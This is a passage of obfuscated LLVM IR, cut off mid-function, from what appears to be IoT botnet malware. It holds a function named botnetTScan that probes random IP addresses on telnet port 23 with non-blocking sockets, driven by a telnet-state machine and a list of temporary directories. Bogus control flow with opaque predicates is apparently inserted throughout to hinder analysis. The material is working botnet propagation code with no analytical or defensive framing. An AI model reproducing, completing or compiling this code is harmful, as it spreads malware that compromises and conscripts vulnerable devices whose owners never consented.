  call void @bcopy(i8* %19, i8* %21, i64 %25) #3
  %26 = load i16, i16* %5, align 2
  %27 = call zeroext i16 @htons(i16 zeroext %26) #10
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call i32 @socket(i32 2, i32 1, i32 6) #3
  store i32 %30, i32* %9, align 4
  %31 = load i32, i32* %9, align 4
  %32 = bitcast i32* %8 to i8*
  %33 = call i32 @setsockopt(i32 %31, i32 6, i32 1, i8* %32, i32 4) #3
  %34 = load i32, i32* %9, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %14
  store i32 0, i32* %3, align 4
  br label %61

; <label>:37:                                     ; preds = %14
  %38 = load i32, i32* @x.69
  %39 = load i32, i32* @y.70
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %37
  %46 = load i32, i32* %9, align 4
  %47 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %48 = call i32 @connect(i32 %46, %struct.sockaddr* %47, i32 16)
  %49 = icmp eq i32 %48, -1
  %50 = load i32, i32* @x.69
  %51 = load i32, i32* @y.70
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %49, label %58, label %59

; <label>:58:                                     ; preds = %originalBBpart2
  store i32 0, i32* %3, align 4
  br label %61

; <label>:59:                                     ; preds = %originalBBpart2
  %60 = load i32, i32* %9, align 4
  store i32 %60, i32* %3, align 4
  br label %61

; <label>:61:                                     ; preds = %59, %58, %36, %13
  %62 = load i32, i32* %3, align 4
  ret i32 %62

originalBBalteredBB:                              ; preds = %originalBB, %37
  %63 = load i32, i32* %9, align 4
  %64 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %65 = call i32 @connect(i32 %63, %struct.sockaddr* %64, i32 16)
  %66 = icmp eq i32 %65, -1
  br label %originalBB
}

declare %struct.hostent* @gethostbyname(i8*) #2

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #1

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @botnetTScan(i32, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [128 x i8], align 16
  %10 = alloca i8, align 1
  %11 = alloca i32, align 4
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %23 = load i32, i32* %4, align 4
  store i32 %23, i32* %11, align 4
  %24 = call i64 @time(i64* null) #3
  %25 = call i32 @rand_cmwc()
  %26 = zext i32 %25 to i64
  %27 = xor i64 %24, %26
  %28 = trunc i64 %27 to i32
  call void @srand(i32 %28) #3
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call zeroext i16 @htons(i16 zeroext 23) #10
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %33 = getelementptr inbounds [8 x i8], [8 x i8]* %32, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %33, i8 0, i64 8, i32 4, i1 false)
  %34 = call noalias i8* @malloc(i64 1025) #3
  store i8* %34, i8** %17, align 8
  %35 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %35, i8 0, i64 1025, i32 1, i1 false)
  %36 = load i32, i32* %11, align 4
  %37 = zext i32 %36 to i64
  %38 = call i8* @llvm.stacksave()
  store i8* %38, i8** %19, align 8
  %39 = alloca %struct.telstate_t, i64 %37, align 16
  %40 = bitcast %struct.telstate_t* %39 to i8*
  %41 = load i32, i32* %11, align 4
  %42 = sext i32 %41 to i64
  %43 = mul i64 %42, 5
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 %43, i32 16, i1 false)
  store i32 0, i32* %5, align 4
  br label %44

; <label>:44:                                     ; preds = %originalBBpart213, %2
  %45 = load i32, i32* @x.71
  %46 = load i32, i32* @y.72
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %44
  %53 = load i32, i32* %5, align 4
  %54 = load i32, i32* %11, align 4
  %55 = icmp slt i32 %53, %54
  %56 = load i32, i32* @x.71
  %57 = load i32, i32* @y.72
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %55, label %64, label %97

; <label>:64:                                     ; preds = %originalBBpart2
  %65 = load i32, i32* %5, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %66
  %68 = bitcast %struct.telstate_t* %67 to i8*
  call void @llvm.memset.p0i8.i64(i8* %68, i8 0, i64 32, i32 16, i1 false)
  %69 = load i32, i32* %5, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %70
  %72 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %71, i32 0, i32 3
  store i8 1, i8* %72, align 1
  %73 = load i8*, i8** %17, align 8
  %74 = load i32, i32* %5, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %75
  %77 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %76, i32 0, i32 9
  store i8* %73, i8** %77, align 8
  br label %78

; <label>:78:                                     ; preds = %64
  %79 = load i32, i32* @x.71
  %80 = load i32, i32* @y.72
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %78
  %87 = load i32, i32* %5, align 4
  %88 = add nsw i32 %87, 1
  store i32 %88, i32* %5, align 4
  %89 = load i32, i32* @x.71
  %90 = load i32, i32* @y.72
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBBpart213, label %originalBB1alteredBB

originalBBpart213:                                ; preds = %originalBB1
  br label %44

; <label>:97:                                     ; preds = %originalBBpart2
  store i32 0, i32* %7, align 4
  br label %98

; <label>:98:                                     ; preds = %121, %97
  %99 = load i32, i32* @x.71
  %100 = load i32, i32* @y.72
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %98
  %107 = load i32, i32* %7, align 4
  %108 = add nsw i32 %107, 1
  store i32 %108, i32* %7, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds [11 x i8*], [11 x i8*]* @tmpdirs, i64 0, i64 %109
  %111 = load i8*, i8** %110, align 8
  %112 = icmp ne i8* %111, null
  %113 = load i32, i32* @x.71
  %114 = load i32, i32* @y.72
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBBpart228, label %originalBB15alteredBB

originalBBpart228:                                ; preds = %originalBB15
  br i1 %112, label %121, label %122

; <label>:121:                                    ; preds = %originalBBpart228
  br label %98

; <label>:122:                                    ; preds = %originalBBpart228
  br label %123

; <label>:123:                                    ; preds = %originalBBpart2157, %122
  br label %124

; <label>:124:                                    ; preds = %123
  %125 = load i32, i32* @x.71
  %126 = load i32, i32* @y.72
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %124
  store i32 0, i32* %5, align 4
  %133 = load i32, i32* @x.71
  %134 = load i32, i32* @y.72
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %141

; <label>:141:                                    ; preds = %1179, %originalBBpart232
  %142 = load i32, i32* %5, align 4
  %143 = load i32, i32* %11, align 4
  %144 = icmp slt i32 %142, %143
  br i1 %144, label %145, label %1182

; <label>:145:                                    ; preds = %141
  %146 = load i32, i32* @x.71
  %147 = load i32, i32* @y.72
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %145
  %154 = load i32, i32* %5, align 4
  %155 = sext i32 %154 to i64
  %156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %155
  %157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %156, i32 0, i32 7
  %158 = load i32, i32* %157, align 16
  %159 = icmp eq i32 %158, 0
  %160 = load i32, i32* @x.71
  %161 = load i32, i32* @y.72
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %159, label %168, label %175

; <label>:168:                                    ; preds = %originalBBpart236
  %169 = call i64 @time(i64* null) #3
  %170 = trunc i64 %169 to i32
  %171 = load i32, i32* %5, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %172
  %174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %173, i32 0, i32 7
  store i32 %170, i32* %174, align 16
  br label %175

; <label>:175:                                    ; preds = %168, %originalBBpart236
  %176 = load i32, i32* %5, align 4
  %177 = sext i32 %176 to i64
  %178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %177
  %179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %178, i32 0, i32 2
  %180 = load i8, i8* %179, align 8
  %181 = zext i8 %180 to i32
  switch i32 %181, label %1162 [
    i32 0, label %182
    i32 1, label %398
    i32 2, label %529
    i32 3, label %639
    i32 4, label %684
    i32 5, label %762
    i32 6, label %839
    i32 7, label %1051
  ]

; <label>:182:                                    ; preds = %175
  %183 = load i32, i32* %5, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %184
  %186 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %185, i32 0, i32 3
  %187 = load i8, i8* %186, align 1
  %188 = zext i8 %187 to i32
  %189 = icmp eq i32 %188, 1
  br i1 %189, label %190, label %210

; <label>:190:                                    ; preds = %182
  %191 = load i32, i32* %5, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %192
  %194 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %193, i32 0, i32 9
  %195 = load i8*, i8** %194, align 8
  store i8* %195, i8** %20, align 8
  %196 = load i32, i32* %5, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %197
  %199 = bitcast %struct.telstate_t* %198 to i8*
  call void @llvm.memset.p0i8.i64(i8* %199, i8 0, i64 32, i32 16, i1 false)
  %200 = load i8*, i8** %20, align 8
  %201 = load i32, i32* %5, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %202
  %204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %203, i32 0, i32 9
  store i8* %200, i8** %204, align 8
  %205 = call i32 @GIP()
  %206 = load i32, i32* %5, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %207
  %209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %208, i32 0, i32 1
  store i32 %205, i32* %209, align 4
  br label %290

; <label>:210:                                    ; preds = %182
  %211 = load i32, i32* %5, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %212
  %214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %213, i32 0, i32 3
  %215 = load i8, i8* %214, align 1
  %216 = zext i8 %215 to i32
  %217 = icmp eq i32 %216, 0
  br i1 %217, label %218, label %289

; <label>:218:                                    ; preds = %210
  %219 = load i32, i32* %5, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %220
  %222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %221, i32 0, i32 5
  %223 = load i8, i8* %222, align 1
  %224 = add i8 %223, 1
  store i8 %224, i8* %222, align 1
  %225 = load i32, i32* %5, align 4
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %226
  %228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %227, i32 0, i32 4
  %229 = load i8, i8* %228, align 2
  %230 = add i8 %229, 1
  store i8 %230, i8* %228, align 2
  %231 = load i32, i32* %5, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %232
  %234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %233, i32 0, i32 5
  %235 = load i8, i8* %234, align 1
  %236 = zext i8 %235 to i64
  %237 = icmp eq i64 %236, 36
  br i1 %237, label %238, label %259

; <label>:238:                                    ; preds = %218
  %239 = load i32, i32* @x.71
  %240 = load i32, i32* @y.72
  %241 = sub i32 %239, 1
  %242 = mul i32 %239, %241
  %243 = urem i32 %242, 2
  %244 = icmp eq i32 %243, 0
  %245 = icmp slt i32 %240, 10
  %246 = or i1 %244, %245
  br i1 %246, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %238
  %247 = load i32, i32* %5, align 4
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %248
  %250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %249, i32 0, i32 3
  store i8 1, i8* %250, align 1
  %251 = load i32, i32* @x.71
  %252 = load i32, i32* @y.72
  %253 = sub i32 %251, 1
  %254 = mul i32 %251, %253
  %255 = urem i32 %254, 2
  %256 = icmp eq i32 %255, 0
  %257 = icmp slt i32 %252, 10
  %258 = or i1 %256, %257
  br i1 %258, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %1179

; <label>:259:                                    ; preds = %218
  %260 = load i32, i32* %5, align 4
  %261 = sext i32 %260 to i64
  %262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %261
  %263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %262, i32 0, i32 4
  %264 = load i8, i8* %263, align 2
  %265 = zext i8 %264 to i64
  %266 = icmp eq i64 %265, 36
  br i1 %266, label %267, label %272

; <label>:267:                                    ; preds = %259
  %268 = load i32, i32* %5, align 4
  %269 = sext i32 %268 to i64
  %270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %269
  %271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %270, i32 0, i32 3
  store i8 1, i8* %271, align 1
  br label %1179

; <label>:272:                                    ; preds = %259
  %273 = load i32, i32* @x.71
  %274 = load i32, i32* @y.72
  %275 = sub i32 %273, 1
  %276 = mul i32 %273, %275
  %277 = urem i32 %276, 2
  %278 = icmp eq i32 %277, 0
  %279 = icmp slt i32 %274, 10
  %280 = or i1 %278, %279
  br i1 %280, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %272
  %281 = load i32, i32* @x.71
  %282 = load i32, i32* @y.72
  %283 = sub i32 %281, 1
  %284 = mul i32 %281, %283
  %285 = urem i32 %284, 2
  %286 = icmp eq i32 %285, 0
  %287 = icmp slt i32 %282, 10
  %288 = or i1 %286, %287
  br i1 %288, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %289

; <label>:289:                                    ; preds = %originalBBpart244, %210
  br label %290

; <label>:290:                                    ; preds = %289, %190
  %291 = load i32, i32* @x.71
  %292 = load i32, i32* @y.72
  %293 = sub i32 %291, 1
  %294 = mul i32 %291, %293
  %295 = urem i32 %294, 2
  %296 = icmp eq i32 %295, 0
  %297 = icmp slt i32 %292, 10
  %298 = or i1 %296, %297
  br i1 %298, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %290
  %299 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %299, align 4
  %300 = call zeroext i16 @htons(i16 zeroext 23) #10
  %301 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %300, i16* %301, align 2
  %302 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %303 = getelementptr inbounds [8 x i8], [8 x i8]* %302, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %303, i8 0, i64 8, i32 4, i1 false)
  %304 = load i32, i32* %5, align 4
  %305 = sext i32 %304 to i64
  %306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %305
  %307 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %306, i32 0, i32 1
  %308 = load i32, i32* %307, align 4
  %309 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %310 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %309, i32 0, i32 0
  store i32 %308, i32* %310, align 4
  %311 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %312 = load i32, i32* %5, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %313
  %315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %314, i32 0, i32 0
  store i32 %311, i32* %315, align 16
  %316 = load i32, i32* %5, align 4
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %317
  %319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %318, i32 0, i32 0
  %320 = load i32, i32* %319, align 16
  %321 = icmp eq i32 %320, -1
  %322 = load i32, i32* @x.71
  %323 = load i32, i32* @y.72
  %324 = sub i32 %322, 1
  %325 = mul i32 %322, %324
  %326 = urem i32 %325, 2
  %327 = icmp eq i32 %326, 0
  %328 = icmp slt i32 %323, 10
  %329 = or i1 %327, %328
  br i1 %329, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %321, label %330, label %331

; <label>:330:                                    ; preds = %originalBBpart248
  br label %1179

; <label>:331:                                    ; preds = %originalBBpart248
  %332 = load i32, i32* @x.71
  %333 = load i32, i32* @y.72
  %334 = sub i32 %332, 1
  %335 = mul i32 %332, %334
  %336 = urem i32 %335, 2
  %337 = icmp eq i32 %336, 0
  %338 = icmp slt i32 %333, 10
  %339 = or i1 %337, %338
  br i1 %339, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %331
  %340 = load i32, i32* %5, align 4
  %341 = sext i32 %340 to i64
  %342 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %341
  %343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %342, i32 0, i32 0
  %344 = load i32, i32* %343, align 16
  %345 = load i32, i32* %5, align 4
  %346 = sext i32 %345 to i64
  %347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %346
  %348 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %347, i32 0, i32 0
  %349 = load i32, i32* %348, align 16
  %350 = call i32 (i32, i32, ...) @fcntl(i32 %349, i32 3, i8* null)
  %351 = or i32 %350, 2048
  %352 = call i32 (i32, i32, ...) @fcntl(i32 %344, i32 4, i32 %351)
  %353 = load i32, i32* %5, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %354
  %356 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %355, i32 0, i32 0
  %357 = load i32, i32* %356, align 16
  %358 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %359 = call i32 @connect(i32 %357, %struct.sockaddr* %358, i32 16)
  %360 = icmp eq i32 %359, -1
  %361 = load i32, i32* @x.71
  %362 = load i32, i32* @y.72
  %363 = sub i32 %361, 1
  %364 = mul i32 %361, %363
  %365 = urem i32 %364, 2
  %366 = icmp eq i32 %365, 0
  %367 = icmp slt i32 %362, 10
  %368 = or i1 %366, %367
  br i1 %368, label %originalBBpart265, label %originalBB50alteredBB

originalBBpart265:                                ; preds = %originalBB50
  br i1 %360, label %369, label %393

; <label>:369:                                    ; preds = %originalBBpart265
  %370 = call i32* @__errno_location() #10
  %371 = load i32, i32* %370, align 4
  %372 = icmp ne i32 %371, 115
  br i1 %372, label %373, label %393

; <label>:373:                                    ; preds = %369
  %374 = load i32, i32* @x.71
  %375 = load i32, i32* @y.72
  %376 = sub i32 %374, 1
  %377 = mul i32 %374, %376
  %378 = urem i32 %377, 2
  %379 = icmp eq i32 %378, 0
  %380 = icmp slt i32 %375, 10
  %381 = or i1 %379, %380
  br i1 %381, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %373
  %382 = load i32, i32* %5, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %383
  call void @reset_telstate(%struct.telstate_t* %384)
  %385 = load i32, i32* @x.71
  %386 = load i32, i32* @y.72
  %387 = sub i32 %385, 1
  %388 = mul i32 %385, %387
  %389 = urem i32 %388, 2
  %390 = icmp eq i32 %389, 0
  %391 = icmp slt i32 %386, 10
  %392 = or i1 %390, %391
  br i1 %392, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  br label %397

; <label>:393:                                    ; preds = %369, %originalBBpart265
  %394 = load i32, i32* %5, align 4
  %395 = sext i32 %394 to i64
  %396 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %395
  call void @advance_state(%struct.telstate_t* %396, i32 1)
  br label %397

; <label>:397:                                    ; preds = %393, %originalBBpart269
  br label %1162

; <label>:398:                                    ; preds = %175
  br label %399

; <label>:399:                                    ; preds = %398
  %400 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %401 = getelementptr inbounds [16 x i64], [16 x i64]* %400, i64 0, i64 0
  %402 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %401) #3, !srcloc !6
  %403 = extractvalue { i64, i64* } %402, 0
  %404 = extractvalue { i64, i64* } %402, 1
  %405 = trunc i64 %403 to i32
  store i32 %405, i32* %21, align 4
  %406 = ptrtoint i64* %404 to i64
  %407 = trunc i64 %406 to i32
  store i32 %407, i32* %22, align 4
  br label %408

; <label>:408:                                    ; preds = %399
  br label %409

; <label>:409:                                    ; preds = %408
  %410 = load i32, i32* %5, align 4
  %411 = sext i32 %410 to i64
  %412 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %411
  %413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %412, i32 0, i32 0
  %414 = load i32, i32* %413, align 16
  %415 = srem i32 %414, 64
  %416 = zext i32 %415 to i64
  %417 = shl i64 1, %416
  %418 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %419 = load i32, i32* %5, align 4
  %420 = sext i32 %419 to i64
  %421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %420
  %422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %421, i32 0, i32 0
  %423 = load i32, i32* %422, align 16
  %424 = sdiv i32 %423, 64
  %425 = sext i32 %424 to i64
  %426 = getelementptr inbounds [16 x i64], [16 x i64]* %418, i64 0, i64 %425
  %427 = load i64, i64* %426, align 8
  %428 = or i64 %427, %417
  store i64 %428, i64* %426, align 8
  %429 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %429, align 8
  %430 = load i32, i32* %3, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %431, i64* %432, align 8
  %433 = load i32, i32* %5, align 4
  %434 = sext i32 %433 to i64
  %435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %434
  %436 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %435, i32 0, i32 0
  %437 = load i32, i32* %436, align 16
  %438 = add nsw i32 %437, 1
  %439 = call i32 @select(i32 %438, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %439, i32* %6, align 4
  %440 = load i32, i32* %6, align 4
  %441 = icmp eq i32 %440, 1
  br i1 %441, label %442, label %490

; <label>:442:                                    ; preds = %409
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %443 = load i32, i32* %5, align 4
  %444 = sext i32 %443 to i64
  %445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %444
  %446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %445, i32 0, i32 0
  %447 = load i32, i32* %446, align 16
  %448 = bitcast i32* %15 to i8*
  %449 = call i32 @getsockopt(i32 %447, i32 1, i32 4, i8* %448, i32* %14) #3
  %450 = load i32, i32* %15, align 4
  %451 = icmp ne i32 %450, 0
  br i1 %451, label %452, label %456

; <label>:452:                                    ; preds = %442
  %453 = load i32, i32* %5, align 4
  %454 = sext i32 %453 to i64
  %455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %454
  call void @reset_telstate(%struct.telstate_t* %455)
  br label %473

; <label>:456:                                    ; preds = %442
  %457 = load i32, i32* %5, align 4
  %458 = sext i32 %457 to i64
  %459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %458
  %460 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %459, i32 0, i32 0
  %461 = load i32, i32* %460, align 16
  %462 = load i32, i32* %5, align 4
  %463 = sext i32 %462 to i64
  %464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %463
  %465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %464, i32 0, i32 0
  %466 = load i32, i32* %465, align 16
  %467 = call i32 (i32, i32, ...) @fcntl(i32 %466, i32 3, i8* null)
  %468 = and i32 %467, -2049
  %469 = call i32 (i32, i32, ...) @fcntl(i32 %461, i32 4, i32 %468)
  %470 = load i32, i32* %5, align 4
  %471 = sext i32 %470 to i64
  %472 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %471
  call void @advance_state(%struct.telstate_t* %472, i32 2)
  br label %473

; <label>:473:                                    ; preds = %456, %452
